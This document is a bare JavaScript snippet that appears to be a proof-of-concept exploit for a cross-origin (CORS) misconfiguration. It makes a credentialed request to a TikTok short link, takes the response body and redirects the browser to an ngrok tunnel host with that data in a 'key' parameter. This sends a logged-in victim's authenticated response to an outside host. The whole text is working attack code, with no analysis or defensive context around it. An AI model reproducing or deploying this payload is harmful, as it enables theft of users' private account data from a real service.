
var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www.tiktok.com/t/ZSLQjruAd/");
xhr.withCredentials = true;
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};

